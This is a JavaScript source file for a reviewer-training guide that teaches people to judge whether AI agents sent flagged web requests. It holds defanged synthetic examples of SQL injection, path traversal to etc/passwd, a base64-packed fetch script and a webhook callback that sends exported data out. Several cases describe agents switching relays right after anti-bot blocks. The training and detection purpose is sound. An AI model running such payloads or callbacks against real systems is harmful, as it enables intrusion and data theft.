// Evaluator guide: onboarding, worked examples and practice. Registers with `Review`.
//
// A first-run welcome, a guide drawer (`g`) with the method, the evidence
// kinds, the traps, worked examples and a practice round, a coaching box per
// group, and blind review (`h`), which hides model suggestions until a group
// is labelled. Practice never calls the API: nothing here writes a label.
// Every example is synthetic, on reserved `.example` hosts, written defanged.
"use strict";

(() => {
  const { el, keys, toast } = UI;

  // ---- storage: a convenience only, so every access may fail -------------

  const PREFIX = "swarmchase.review.guide.";
  const store = {
    get(k, fallback) {
      try {
        const v = localStorage.getItem(PREFIX + k);
        return v == null ? fallback : JSON.parse(v);
      } catch { return fallback; }
    },
    set(k, v) {
      try { localStorage.setItem(PREFIX + k, JSON.stringify(v)); } catch { /* storage unavailable */ }
    },
  };

  // ---- method content ----------------------------------------------------

  const FM = {
    "FM-4.1": "Grading records",
    "FM-4.5": "Artifact families",
    "FM-4.9": "Benchmark targets and declared testing",
    "FM-4.11": "Independence groups and the context cap",
    "FM-7.10": "Agent likelihood",
    "FM-7.12": "Competing hypotheses",
    "FM-14.1": "Self-identification is forgeable",
    "FM-14.4": "Capture time is not request time",
    "FM-14.5": "Tags get copied after publication",
    "FM-14.6": "Common features cause giant clusters",
    "FM-14.7": "Humans look the same",
    "FM-14.8": "Model residue comes from people too",
    "FM-14.11": "A record is not a success",
    "FM-14.13": "Display truncation looks like model truncation",
    "FM-14.14": "Decoding is heuristic",
    "FM-14.20": "Public records can be planted",
    "FM-14.21": "A tier is not misalignment",
    "FM-14.22": "Correlated rules stack",
    "FM-15.1": "Four questions",
  };
  const cite = (id) => el("span.gd-cite", { title: FM[id] ? `Field Manual: ${FM[id]}` : "Field Manual" }, id);
  const cites = (list) => (list && list.length ? el("span.gd-cites", list.map(cite)) : null);

  const LABELS = [
    {
      label: "agent", name: "Agent",
      text: "An AI agent most likely sent these requests: software in which a model chooses and sends them. It needs a model's hand in the requests and something a person pasting model output would not do, and the group's agent grade at L2 or higher.",
    },
    {
      label: "benign", name: "Benign",
      text: "Not an agent: a person, a crawler, a mail gateway, or a conventional scanner or script. Benign means not an agent, not harmless. A scanner firing textbook payloads is benign here.",
    },
    {
      label: "unsure", name: "Unsure",
      text: "The evidence fits an agent and a person or tool equally, and nothing in the group separates them. Unsure is a real answer: eval does not count it, while a wrong guess skews the measurement.",
    },
  ];

  const STEPS = [
    ["Read what the records do.", "Open the decoded layers and the rules that matched. Rules that read the same artifact are one piece of evidence, so count them once.", ["FM-14.22"]],
    ["Set the payloads aside.", "Payloads show what was sent, not who sent it. A tester or a scanner sends the same strings through the same relays. Ask what is left.", ["FM-14.7"]],
    ["Look for a model's hand.", "Residue (Markdown, placeholders, tool-call text, chat openers), prose, invented identifiers, a program built for an echo service. People paste chatbot output too, so this alone is weak.", ["FM-4.5", "FM-14.8"]],
    ["Look for behaviour.", "Changed requests right after errors, route escalation, machine pace, fixed fan-out, activity round the clock. The agent grade reads these; archive capture times cannot show them.", ["FM-7.10", "FM-14.4"]],
    ["Look for the other side.", "Declared testing, scanner pace, working hours, practice targets, a mail gateway submitting every link, or one ordinary read.", ["FM-4.9"]],
    ["Keep the explanation with least against it.", "If an agent and a person both survive, the label is unsure. Agent needs a grade of L2 or higher; below it, or with no grade, unsure is the most the evidence allows. Label who sent the requests, never whether they did harm.", ["FM-7.12", "FM-15.1"]],
    ["Leave a note when it matters.", "Press n before labelling when the label rests on something the page does not show plainly, or on a judgement another reviewer might not share.", []],
  ];

  const SUGGESTION_TIPS = [
    "A suggestion comes from a language model that read the same defanged text you see, and nothing more. It is a second opinion, never the label.",
    "Decide first, then compare. Blind review (h) hides every suggestion until you have labelled the group.",
    "Read the model's reason against the evidence. A common model error is calling payloads agent evidence.",
    "Use the Disagree tab to revisit groups where you and the model differ. Neither side is right by default.",
  ];

  const KINDS = [
    ["exploit", "Exploit", "An attack payload: SQL injection, traversal, XSS, template or command injection.", "Who sent it. Testers and scanners send the same strings."],
    ["exfil", "Exfil", "A callback channel: a webhook inbox, an out-of-band host, a paste or a topic.", "Who reads it. Testers use request catchers daily."],
    ["agent_marker", "Marker", "Model-output residue, a generation loop, or an agent test tag.", "That an agent sent it. People paste chatbot answers, and anyone can type a tag."],
    ["carrier", "Carrier", "A program or page carried through an echo service, a data: URL or a code playground (tool escalation, SC-T2).", "Harm. A program that fetches a schedule is tool use, not misuse."],
    ["relay", "Relay", "A reader, proxy or translate service in front of the target.", "Anything on its own. Reading through a relay is ordinary."],
    ["self_id", "Self-ID", "A model or vendor name in the request.", "Who built or ran it. It costs nothing to write."],
    ["anti_bot", "Anti-bot", "Generating anti-bot tokens or calling a captcha solver.", "Who. Scrapers do it too."],
    ["cache_buster", "Cache buster", "A random parameter that defeats caches.", "Anything on its own."],
    ["header", "Header", "Request header traits, where a source records headers.", "Much: most public records carry none."],
    ["outcome", "Outcome", "Where a scan ended: a challenge page or a network error.", "Success. A record is an attempt, not a result."],
    ["infra", "Infra", "Hosting known to run agent sandboxes.", "Which tenant. Networks are shared."],
  ];
  const CONTEXT = new Set(["relay", "cache_buster", "self_id", "header", "outcome"]);

  const GRADES = [
    ["L0", "payloads only", "Payloads, nothing more."],
    ["L1", "self-described", "A vendor name or an agent test tag. Worded like L0, because anyone can write it."],
    ["L2", "model-written", "Residue, prose, invented identifiers, a repeated cut length, stale knowledge or dates."],
    ["L3", "adaptive", "L2, and requests that change in answer to responses."],
    ["L4", "agent likely", "L3, and pace or scale beyond one person, with no working-hours rhythm against it."],
    ["L5", "documented", "Casework only: operator logs or the provider's confirmation."],
  ];

  const TRAPS = [
    ["FM-14.7", "A significant tier means a payload, not an agent.", "A penetration tester or a conventional scanner leaves the same records.", "Ask what besides the payloads points to a model."],
    ["FM-14.8", "Residue comes from people too.", "A person who pastes a chatbot's answer leaves the same Markdown, placeholders and tool-call text.", "Treat residue as weak; look for behaviour before agent."],
    ["FM-14.1", "Self-identification is forgeable.", "A vendor name or test tag costs nothing, and agents misreport who built them.", "Never label agent on a name alone, and never read it as naming a developer."],
    ["FM-14.21", "Tool use is not misuse.", "A data task done with a fetch program through an echo service grades suggestive or significant.", "Label who sent it. Whether it went beyond its task is a separate finding."],
    ["FM-14.22", "Correlated rules stack.", "One program fires the echo, script, fetch and title rules together.", "Count rules that read the same thing once."],
    ["FM-14.4", "Capture time is not request time.", "An archive timestamp is when the archive saved the URL, maybe days later.", "Read no pace or rhythm from captures. The grade stops at L2 there."],
    ["FM-14.5", "Tags get copied after publication.", "A tag quoted in a report can be reused by anyone who read it.", "A published tag turning up again is a soft hint, not the same operator."],
    ["FM-14.6", "One common feature can merge strangers.", "A popular relay or tag value can join unrelated clients into one cluster.", "Spot-check records from both ends of a large group before labelling it at once."],
    ["FM-14.13", "A cut URL may be the service's cut.", "Scan services truncate long URLs, which looks like a model's output limit.", "Do not read truncation as residue without other evidence."],
    ["FM-14.14", "Decoding is heuristic.", "An opaque id can decode to text that looks meaningful.", "Check a decoded layer makes sense before resting a label on it."],
    ["FM-14.20", "Public records can be planted.", "Anyone can submit any URL to a scan service or archive.", "A label says what the records show; doubts about provenance go in a note."],
  ];

  // ---- worked examples and practice cases ---------------------------------

  const EXAMPLES = [
    {
      title: "SQL injection through a reader relay",
      tier: "significant", summary: "2 records · urlquery submit times, 7 minutes apart, mid-afternoon",
      urls: [
        "hxxps://r[.]jina[.]ai/hxxps://shop[.]example/item?id=1%27%20OR%20%271%27=%271",
        "hxxps://r[.]jina[.]ai/hxxps://shop[.]example/item?id=1%20UNION%20SELECT%20null,null--",
      ],
      rules: [["exploit.sqli_boolean", "exploit"], ["exploit.sqli_union", "exploit"], ["relay.jina", "relay"]],
      grade: ["L0", "payloads only"],
      notes: ["No residue, tag or callback. Counter-signal: activity in one time zone's working hours."],
      answer: "unsure", ok: ["benign"],
      why: "Textbook payloads through a public relay are exactly what a penetration tester sends. Nothing here separates an agent from a person, so the honest label is unsure. Benign is defensible if a note or the case shows a person, such as a confirmed test. Agent is not: the payloads are the only evidence.",
      cites: ["FM-14.7", "FM-7.12"],
    },
    {
      title: "Pasted chatbot residue",
      tier: "significant", summary: "1 record · urlquery submit time",
      urls: ["hxxps://portal[.]city[.]example/login?user=admin%27--&pass=YOUR_PASSWORD_HERE"],
      rules: [["exploit.sqli_quote", "exploit"], ["marker.placeholder", "agent_marker"]],
      grade: ["L2", "model-written"],
      notes: ["One record, no retry, no other request to the host."],
      answer: "unsure", ok: [],
      why: "The unfilled placeholder shows a model wrote the URL. It does not show a model sent it: a person who asks a chatbot for a login bypass and pastes the answer into a scan form leaves this exact record. With no adaptation, pace or scale there is nothing to tell them apart.",
      cites: ["FM-14.8", "FM-7.10"],
    },
    {
      title: "A run-tagged program through an echo service",
      tier: "significant", summary: "3 records · wayback captures over 2 days",
      urls: ["hxxps://httpbin[.]org/base64/PHNjcmlwdD5mZXRjaCgiaHR0cHM6Ly90di5leGFtcGxlL2FwaS9zY2hlZHVsZT9kYXk9MjAyNi0wOC0wMyZ1cXRhZz1yN2syIikudGhlbihy…"],
      decoded: "<script>fetch(\"hxxps://tv[.]example/api/schedule?day=2026-08-03&uqtag=r7k2\").then(r=>r.text()).then(t=>document.title=t)</script>",
      rules: [["carrier.httpbin", "carrier"], ["carrier.inline_fetch_program", "carrier"], ["marker.title_write", "agent_marker"], ["marker.uq_tags", "agent_marker"]],
      grade: ["L1", "self-described"],
      notes: ["The three program rules read one artifact and count once. The tag is a second, independent indicator."],
      answer: "unsure", ok: [],
      why: "A fetch program packed into an echo service, writing its result into the page title, with a run tag beside it, looks like published agent runs. But the grade is L1: the tag is self-description anyone can type, and the program's shape is not a model's hand. Agent needs L2 or higher, so the label is unsure. Note what points toward an agent, so the group is easy to find again if more records raise the grade. Benign is not right either: a person who wants a TV schedule opens the page.",
      cites: ["FM-14.21", "FM-14.22"],
    },
    {
      title: "A plain page read through a relay",
      tier: "noise", summary: "1 record · wayback capture",
      urls: ["hxxps://r[.]jina[.]ai/hxxps://news[.]example/2026/08/rail-strike-update"],
      rules: [["relay.jina", "relay"]],
      grade: ["L0", "payloads only"],
      notes: ["Unclustered, graded alone. No other rule fired."],
      answer: "benign", ok: [],
      why: "One relay hit on an ordinary article. Readers, summarisers and people all read pages this way, and a relay is context that never makes a lead on its own. Nothing here is evidence of an agent.",
      cites: ["FM-4.1", "FM-4.11"],
    },
    {
      title: "Adaptive probing at machine pace",
      tier: "significant", summary: "41 records · urlquery submit times over 22 hours",
      urls: [
        "hxxps://records[.]agency[.]example/search?q=%5Bpermits%5D(hxxps://records[.]agency[.]example)%27%20OR%201=1--",
        "hxxps://r[.]jina[.]ai/hxxps://records[.]agency[.]example/search?q=permits%27%20UNION%20SELECT%20null--",
      ],
      rules: [["exploit.sqli_boolean", "exploit"], ["exploit.sqli_union", "exploit"], ["marker.md_link", "agent_marker"], ["relay.jina", "relay"]],
      grade: ["L4", "agent likely"],
      notes: [
        "Signals: model-output residue; a changed request 2 to 4 seconds after each challenge page; a route escalation to a relay; activity round the clock.",
        "No counter-signals.",
      ],
      answer: "agent", ok: [],
      why: "Markdown residue shows a model wrote the requests, the changes after each block show it reading responses, and doing so within seconds all day and night is beyond one person. No counter-signal stands against it. This is the strongest evidence the page computes.",
      cites: ["FM-7.10"],
    },
  ];

  const PRACTICE = [
    {
      title: "Traversal at scanner pace",
      tier: "significant", summary: "120 records · urlquery submit times over 70 seconds",
      urls: ["hxxps://files[.]example/download?path=..%2F..%2F..%2Fetc%2Fpasswd", "hxxps://files[.]example/view?doc=..%2F..%2F..%2Fetc%2Fpasswd"],
      rules: [["exploit.traversal", "exploit"]],
      grade: ["L0", "payloads only"],
      notes: ["30 parameters tried in a fixed order, two a second. Requests after errors are unchanged.", "Counter-signal: a probe chain at tool pace with no change after errors, as a scanner runs a list."],
      answer: "benign", ok: ["unsure"],
      why: "Fast but deaf to responses: a list worked through in order whatever comes back is a conventional scanner, and benign here means not an agent, not harmless. Unsure is defensible; agent is not.",
      cites: ["FM-14.7", "FM-7.10"],
    },
    {
      title: "A translated page read",
      tier: "noise", summary: "1 record · wayback capture",
      urls: ["hxxps://www-records-agency-example[.]translate[.]goog/permits/fees?_x_tr_sl=auto&_x_tr_tl=en"],
      rules: [["relay.translate_goog", "relay"]],
      grade: ["L0", "payloads only"], notes: ["Unclustered, graded alone."],
      answer: "benign", ok: [],
      why: "A person reading a public fee page through a translate proxy. A relay is context only, and nothing else fired.",
      cites: ["FM-4.11"],
    },
    {
      title: "Callback with adaptive retries",
      tier: "significant", summary: "9 records · urlquery submit times over 4 minutes",
      urls: [
        "hxxps://api[.]crm[.]example/export?format=csv&notify=hxxps://webhook[.]site/0b6c1f0e-1111-4c2a-9a55-3f2e1d0c9b8a",
        "hxxps://api[.]crm[.]example/export?format=%60csv%60&scope=all&notify=hxxps://webhook[.]site/0b6c1f0e-1111-4c2a-9a55-3f2e1d0c9b8a",
      ],
      rules: [["exfil.webhook_site", "exfil"], ["marker.json_quote_residue", "agent_marker"], ["outcome.challenge", "outcome"]],
      grade: ["L3", "adaptive"],
      notes: ["Signals: model-output residue; a changed request 6 to 20 seconds after each challenge page.", "No counter-signals. No working-hours rhythm to read from 4 minutes."],
      answer: "agent", ok: ["unsure"],
      why: "Residue, a callback inbox and parameters rewritten within seconds of every block point to a model in a loop. A person stepping through a proxy repeater with a chatbot's help can reach L3 too, so unsure is defensible. Benign is not: nothing here shows a person or a tool.",
      cites: ["FM-7.10", "FM-7.12"],
    },
    {
      title: "Declared security test",
      tier: "significant", summary: "6 records · urlquery submit times, 10:05 to 11:40",
      urls: ["hxxps://portal[.]bank[.]example/login?u=%27%20OR%201=1--"],
      rules: [["exploit.sqli_boolean", "exploit"]],
      grade: ["L0", "payloads only"],
      notes: ["The submitted user agent declares an authorised security test and gives a contact.", "Counter-signals: declares authorised testing; working-hours rhythm."],
      answer: "unsure", ok: ["benign"],
      why: "Declared testing is self-identification too, and an agent can copy it from its prompt. It leans toward a person but stays unchecked until the admin confirms it with the owner it names. Unsure, or benign if you weigh the working-hours rhythm; agent has nothing behind it.",
      cites: ["FM-4.9", "FM-14.1"],
    },
    {
      title: "Prose searches round the clock",
      tier: "suggestive", summary: "26 records · urlquery submit times over 19 hours",
      urls: [
        "hxxps://r[.]jina[.]ai/hxxps://search[.]example/?q=what%20are%20the%20opening%20hours%20of%20the%20permit%20office%20in%20riverside",
        "hxxps://api[.]allorigins[.]win/raw?url=hxxps://search[.]example/?q=what%20are%20the%20opening%20hours%20of%20the%20permit%20office%20in%20riverside",
      ],
      rules: [["relay.jina", "relay"], ["relay.allorigins", "relay"], ["outcome.challenge", "outcome"]],
      grade: ["L4", "agent likely"],
      notes: ["Signals: prose in parameters; a route escalation to a second relay 3 seconds after a challenge; parallel fan-out of width 4; activity round the clock.", "No payload anywhere."],
      answer: "agent", ok: [],
      why: "No payload at all, and still an agent: model-written prose, a switch of route seconds after a block, a fixed fan-out and a day without rest. The label says who sent the requests. Whether reading search results was within its task is a separate finding.",
      cites: ["FM-15.1", "FM-7.10"],
    },
    {
      title: "An unrendered template",
      tier: "suggestive", summary: "1 record · commoncrawl capture",
      urls: ["hxxps://shop[.]example/products/{{product.slug}}?ref={{campaign}}"],
      rules: [["marker.template_unrendered", "agent_marker"]],
      grade: ["L2", "model-written"], notes: ["Unclustered, graded alone. The capture comes from a crawl of the shop's own pages."],
      answer: "benign", ok: [],
      why: "A crawler followed a link from a page whose front-end template had not rendered. The braces grade L2 as residue, but crawlers capture these every day. L2 allows agent; it never requires it. Benign.",
      cites: ["FM-4.5"],
    },
    {
      title: "A link clicked in a chatbot answer",
      tier: "noise", summary: "1 record · wayback capture",
      urls: ["hxxps://r[.]jina[.]ai/hxxps://docs[.]example/api/quickstart?utm_source=chatgpt[.]com"],
      rules: [["relay.jina", "relay"], ["selfid.vendor_name", "self_id"]],
      grade: ["L1", "self-described"], notes: ["Unclustered, graded alone."],
      answer: "benign", ok: ["unsure"],
      why: "A vendor name and a relay are two context hits, which together stay noise. A chatbot adds this tracking parameter to links a person clicks in its answers. Nothing here shows an agent sent the request.",
      cites: ["FM-4.11", "FM-14.1"],
    },
    {
      title: "A copied tag",
      tier: "suggestive", summary: "1 record · wayback capture, months after a report quoted the tag",
      urls: ["hxxps://search[.]example/?q=CHATGPTTEST1"],
      rules: [["marker.test_tag", "agent_marker"]],
      grade: ["L1", "self-described"],
      notes: ["The tag is on the published-tags list: a burned identifier."],
      answer: "benign", ok: ["unsure"],
      why: "Someone searched for a tag a public report had quoted, most likely a reader looking it up. A copied tag is not evidence of the original operator, and a capture shows no behaviour. Benign, or unsure if you want to keep it open.",
      cites: ["FM-14.5", "FM-14.4"],
    },
  ];

  // ---- shared pieces -----------------------------------------------------

  const verdictName = (l) => (LABELS.find((x) => x.label === l) || { name: l }).name;

  function caseCard(c) {
    return el("div.gd-case",
      el("div.gd-case-head",
        el("span.tier." + c.tier, el("span.dot." + c.tier), c.tier),
        el("span.gd-case-sum", c.summary)),
      c.urls.map((u) => el("pre.mono", u)),
      c.decoded ? el("div.gd-decoded", el("span.gd-k", "Decoded layer"), el("pre.mono", c.decoded)) : null,
      el("div.rules.gd-rules", c.rules.map(([id, kind]) => el("span.rule.k-" + kind, el("span.kdot"), id))),
      c.grade ? el("p.gd-grade", el("span.gd-k", "Agent grade"), el("span.grade", c.grade[0]), c.grade[1])
        : el("p.gd-grade", el("span.gd-k", "Agent grade"), el("span.muted", "none")),
      c.notes && c.notes.length ? el("ul.gd-notes", c.notes.map((n) => el("li", n))) : null);
  }

  function labelChip(l) { return el("span.chip." + l, verdictName(l)); }

  // ---- welcome -------------------------------------------------------------

  function welcome() {
    if (document.querySelector(".overlay")) return;
    const done = () => { store.set("welcomed", true); o.remove(); };
    const step = (n, title, body) => el("li.gd-step", el("span.gd-num", String(n)), el("div", el("b", title), el("p", body)));
    const o = el("div.overlay.gd-welcome-overlay", { onclick: (e) => { if (e.target === o) done(); } },
      el("div.card.gd-welcome", { role: "dialog", "aria-modal": "true", "aria-labelledby": "gd-welcome-title" },
        el("p.gd-eyebrow", "Lead review"),
        el("h2#gd-welcome-title", "Welcome. Here is the job."),
        el("ol.gd-steps",
          step(1, "Answer one question per group.", "Did an AI agent send these requests? Not whether they did harm, and not whether the rules scored them right."),
          step(2, "Agent, benign or unsure.", "Benign means not an agent: a person, crawler or scanner, even one sending attacks. Unsure is a real answer, and better than a guess."),
          step(3, "Payloads do not show an agent.", "A penetration tester through a relay leaves the same records. Look for a model's hand and for machine behaviour: the agent grade lists both."),
          step(4, "Suggestions are a second opinion.", "Decide first, then compare. Blind review hides them until you label.")),
        el("div.gd-welcome-actions",
          el("button.btn.primary", { onclick: () => { done(); openGuide("practice"); } }, `Practice on ${PRACTICE.length} cases`),
          el("button.btn", { onclick: () => { done(); openGuide("method"); } }, "Read the guide"),
          el("button.btn.ghost", { onclick: done }, "Start reviewing")),
        el("p.gd-welcome-foot", "Open the guide any time with ", el("kbd", "G"), ". ", el("kbd", "?"), " lists every key.")));
    document.body.append(o);
    o.querySelector(".btn.primary").focus();
  }

  // ---- the guide drawer ----------------------------------------------------

  const TABS = [
    { id: "method", name: "Method" },
    { id: "evidence", name: "Evidence" },
    { id: "traps", name: "Traps" },
    { id: "examples", name: "Examples" },
    { id: "practice", name: "Practice" },
  ];
  let drawer = null;
  let tab = store.get("tab", "method");
  if (!TABS.some((t) => t.id === tab)) tab = "method";

  function isOpen() { return !!(drawer && drawer.isConnected); }

  function closeGuide() {
    if (isOpen()) drawer.remove();
    drawer = null;
  }

  function openGuide(which) {
    if (which) { tab = which; store.set("tab", tab); }
    closeGuide();
    if (document.querySelector(".overlay")) return; // another dialog is up
    const panel = el("aside.gd-drawer", { role: "dialog", "aria-modal": "true", "aria-label": "Evaluator guide", tabindex: "-1" });
    drawer = el("div.overlay.gd-overlay", { onclick: (e) => { if (e.target === drawer) closeGuide(); } }, panel);
    document.body.append(drawer);
    paint();
    panel.focus();
  }

  function paint() {
    if (!isOpen()) return;
    const panel = drawer.firstChild;
    const body = el("div.gd-body", body_());
    panel.replaceChildren(
      el("div.gd-head",
        el("div.gd-title", el("h2", "Evaluator guide"), el("span.gd-sub", "Calibrated labels, from the Field Manual")),
        el("button.btn.ghost.small", { onclick: closeGuide, title: "Close (Esc)" }, "Close", el("kbd", "Esc"))),
      el("div.gd-tabs", el("div.tabs", { role: "tablist" }, TABS.map((t) => el("button" + (t.id === tab ? ".on" : ""), {
        role: "tab", "aria-selected": String(t.id === tab),
        onclick: () => { tab = t.id; store.set("tab", tab); paint(); },
      }, t.name)))),
      body);
    body.scrollTop = 0;
  }

  function body_() {
    switch (tab) {
      case "evidence": return evidenceTab();
      case "traps": return trapsTab();
      case "examples": return examplesTab();
      case "practice": return practiceTab();
      default: return methodTab();
    }
  }

  function methodTab() {
    return [
      el("p.gd-lead", "Each label answers one question: ", el("b", "did an AI agent send these requests?"),
        " Not whether they did harm, whether they stayed within their task, or whether the rules scored them right. Those are separate findings. ", cite("FM-15.1")),
      el("h3.gd-h", "The three labels"),
      el("div.gd-labels", LABELS.map((l) => el("div.gd-label." + l.label,
        el("div.gd-label-head", labelChip(l.label), el("kbd", l.label[0].toUpperCase())), el("p", l.text)))),
      el("h3.gd-h", "Deciding a group"),
      el("ol.gd-proc", STEPS.map(([t, b, c]) => el("li", el("b", t), " ", b, " ", cites(c)))),
      el("h3.gd-h", "Model suggestions"),
      el("ul.gd-list", SUGGESTION_TIPS.map((t) => el("li", t))),
      el("h3.gd-h", "Why calibration matters"),
      el("p", "Your labels are how the rules get measured. A guessed agent label makes the rules look more precise than they are, and a flagged record the admin acts on can become a public notice within a day. A guess costs more than an unsure."),
      el("div.gd-foot",
        el("span", "The same method in prose: ", el("code", "docs/guides/evaluating-leads.md")),
        el("button.btn.ghost.small", { onclick: () => { closeGuide(); welcome(); } }, "Show the welcome again")),
    ];
  }

  function evidenceTab() {
    return [
      el("p.gd-lead", "Rules score what a record contains. The tier says how much payload and tool use it carries; it never says who sent it."),
      el("h3.gd-h", "What each kind of rule shows"),
      el("div.gd-kinds", KINDS.map(([k, name, shows, not]) => el("div.gd-kind",
        el("span.rule.k-" + k, el("span.kdot"), name),
        el("div", el("p", shows), el("p.gd-not", el("span.gd-k", "Not"), not))))),
      el("p.muted.small", "Relay, cache buster, self-identification, header and outcome are context kinds: together they stay below suggestive. ", cite("FM-4.11")),
      el("h3.gd-h", "The agent grade"),
      el("p", "Each cluster gets a grade from the strongest combination of signals it shows, never from a sum. ", cite("FM-7.10")),
      el("div.gd-ladder", GRADES.map(([c, n, d]) => el("div.gd-rung", el("span.grade", c), el("div", el("b", n), el("p", d))))),
      el("p", "The rungs are ordered by kind of evidence, not by measured likelihood. A person stepping through a proxy repeater with a chatbot's help reaches L3. Read the grade with the counter-signals beside it, and with the caps: archive capture times stop it at L2, and a working-hours rhythm at L2 or L3."),
    ];
  }

  function trapsTab() {
    return [
      el("p.gd-lead", "Conclusions that look sound and are not. Each has a Field Manual id you can put in a note."),
      el("div.gd-traps", TRAPS.map(([id, title, body, instead]) => el("div.gd-trap",
        el("div.gd-trap-head", el("b", title), cite(id)),
        el("p", body),
        el("p.gd-instead", el("span.gd-k", "Instead"), instead)))),
    ];
  }

  function examplesTab() {
    return [
      el("p.gd-lead", "Synthetic groups written for this guide, defanged as the page shows records. Each carries the label a calibrated reviewer gives and why."),
      EXAMPLES.map((x) => el("article.gd-example",
        el("h4", x.title),
        caseCard(x),
        el("div.gd-answer",
          el("div.gd-answer-head", el("span.gd-k", "Label"), labelChip(x.answer),
            x.ok.length ? el("span.muted.small", "also defensible: ", x.ok.map(verdictName).join(", ")) : null),
          el("p", x.why), cites(x.cites)))),
    ];
  }

  // ---- practice ------------------------------------------------------------

  const practice = { order: PRACTICE.map((_, i) => i), i: 0, answers: [] };

  function shuffle(a) {
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  }

  function points(c, l) { return l === c.answer ? 1 : c.ok.includes(l) ? 0.5 : 0; }
  function score() { return practice.answers.reduce((s, a, i) => s + points(PRACTICE[practice.order[i]], a), 0); }

  function answer(l) {
    if (practice.i >= PRACTICE.length || practice.answers.length > practice.i) return;
    practice.answers.push(l);
    if (practice.answers.length === PRACTICE.length) {
      const best = store.get("best", null);
      if (best == null || score() > best) store.set("best", score());
    }
    paint();
  }

  function next() {
    if (practice.answers.length <= practice.i) return;
    practice.i++;
    paint();
  }

  function restart() {
    practice.order = shuffle(PRACTICE.map((_, i) => i));
    practice.i = 0;
    practice.answers = [];
    paint();
  }

  function practiceTab() {
    const n = PRACTICE.length;
    if (practice.i >= n) return practiceDone();
    const c = PRACTICE[practice.order[practice.i]];
    const given = practice.answers[practice.i];
    const dots = el("div.gd-dots", practice.order.map((idx, k) => {
      const a = practice.answers[k];
      const p = a == null ? null : points(PRACTICE[idx], a);
      const cls = p == null ? (k === practice.i ? ".now" : "") : p === 1 ? ".right" : p > 0 ? ".close" : ".miss";
      return el("span.gd-dot" + cls, { title: `Case ${k + 1}` });
    }));
    const head = el("div.gd-phead",
      el("span", el("b", `Case ${practice.i + 1}`), ` of ${n}`), dots,
      el("span.gd-score", `Score ${fmt(score())}`));
    const intro = practice.i === 0 && given == null
      ? el("p.gd-lead", "Label each synthetic group as you would on the page. Nothing here is saved to the review file. Keys: ",
        el("kbd", "A"), " ", el("kbd", "B"), " ", el("kbd", "U"), " to answer, ", el("kbd", "↵"), " for the next case.")
      : null;
    const choose = el("div.gd-choose", LABELS.map((l) => el("button.btn.verdict." + l.label + (given === l.label ? ".on" : ""),
      { onclick: () => answer(l.label), disabled: given != null && given !== l.label }, l.name, el("kbd", l.label[0].toUpperCase()))));
    let feedback = null;
    if (given != null) {
      const p = points(c, given);
      const tone = p === 1 ? "right" : p > 0 ? "close" : "miss";
      const heading = p === 1 ? "Right." : p > 0 ? "Defensible." : "Not this one.";
      feedback = el("div.gd-feedback." + tone, { role: "status" },
        el("p.gd-fb-title", el("b", heading), " ", c.title),
        el("div.gd-answer-head", el("span.gd-k", "Best label"), labelChip(c.answer),
          c.ok.length ? el("span.muted.small", "also defensible: ", c.ok.map(verdictName).join(", ")) : null),
        el("p", c.why), cites(c.cites),
        el("div.gd-next", el("button.btn.primary", { onclick: next },
          practice.i + 1 < n ? "Next case" : "See your score", el("kbd", "↵"))));
    }
    return [intro, head, caseCard(c), choose, feedback];
  }

  function fmt(x) { return Number.isInteger(x) ? String(x) : x.toFixed(1); }

  function practiceDone() {
    const n = PRACTICE.length;
    const s = score();
    const given = {}, key = {};
    practice.order.forEach((idx, k) => {
      given[practice.answers[k]] = (given[practice.answers[k]] || 0) + 1;
      key[PRACTICE[idx].answer] = (key[PRACTICE[idx].answer] || 0) + 1;
    });
    const over = (given.agent || 0) - (key.agent || 0);
    const advice = over > 0
      ? `You chose agent ${over} more ${over === 1 ? "time" : "times"} than the key. Over-calling agent is the commonest error: it makes the rules look better than they are. Payloads, residue and names are each weak alone.`
      : over < 0
        ? "You chose agent less often than the key. When residue, adaptation after errors and machine pace come together, with nothing against them, that is the evidence an agent label needs."
        : s >= n - 1
          ? "Well calibrated. The real queue is harder: read each group's coaching box until the traps are second nature."
          : "Your agent calls match the key; the misses are between benign and unsure. Benign needs something that shows a person or a tool, or nothing at all to explain.";
    const best = store.get("best", null);
    return [
      el("div.gd-result",
        el("p.gd-eyebrow", "Practice complete"),
        el("p.gd-big", fmt(s), el("span", ` of ${n}`)),
        el("p.muted.small", "A best label scores 1, a defensible one half.", best != null ? ` Best on this browser: ${fmt(best)}.` : "")),
      el("p", advice),
      el("table.gd-tally", el("thead", el("tr", el("th", ""), LABELS.map((l) => el("th", l.name)))),
        el("tbody",
          el("tr", el("th", "You"), LABELS.map((l) => el("td", String(given[l.label] || 0)))),
          el("tr", el("th", "Key"), LABELS.map((l) => el("td", String(key[l.label] || 0)))))),
      el("ol.gd-review", practice.order.map((idx, k) => {
        const c = PRACTICE[idx];
        const p = points(c, practice.answers[k]);
        return el("li." + (p === 1 ? "right" : p > 0 ? "close" : "miss"),
          el("b.gd-recap-title", c.title), el("span.muted.small", "you"), labelChip(practice.answers[k]),
          p < 1 ? [el("span.muted.small", "best"), labelChip(c.answer)] : null);
      })),
      el("div.gd-next",
        el("button.btn.primary", { onclick: restart }, "Practise again"),
        el("button.btn", { onclick: closeGuide }, "Start reviewing")),
    ];
  }

  // ---- coaching box in the detail pane ------------------------------------

  // Agent test tags are self-description. Callback sequences and title writes
  // belong to a channel or a program; the other marker rules read model-output residue.
  const TAG_RULE = /^marker\.(uq_tags|test_tag|oai_tag|oai_prefix)$/;
  const NOT_RESIDUE = /^marker\.(uq_tags|test_tag|oai_tag|oai_prefix|callback_seq|title_write)$/;

  function tips(g) {
    const out = [];
    const hits = g.items.flatMap((i) => i.hits);
    const kinds = new Set(hits.map((h) => h.kind));
    const strong = [...kinds].filter((k) => !CONTEXT.has(k));
    const has = (k) => kinds.has(k);
    const tag = hits.some((h) => TAG_RULE.test(h.rule));
    const residue = hits.some((h) => h.kind === "agent_marker" && !NOT_RESIDUE.test(h.rule));
    const channel = has("exfil") || hits.some((h) => h.rule === "marker.callback_seq");
    const payload = has("exploit") || channel;
    const grade = g.grade || null;
    const level = grade ? Number(String(grade.code).slice(1)) || 0 : null;
    const capture = !!grade && grade.caps.some((c) => /capture/i.test(c));
    const add = (tone, text, refs) => out.push({ tone, text, refs });

    if (!kinds.size) {
      add("info", "No rule fired: an unflagged sample. Most are ordinary, so benign unless something reads as an agent. A miss found here is valuable; say in a note what gave it away.", []);
    } else if (!strong.length) {
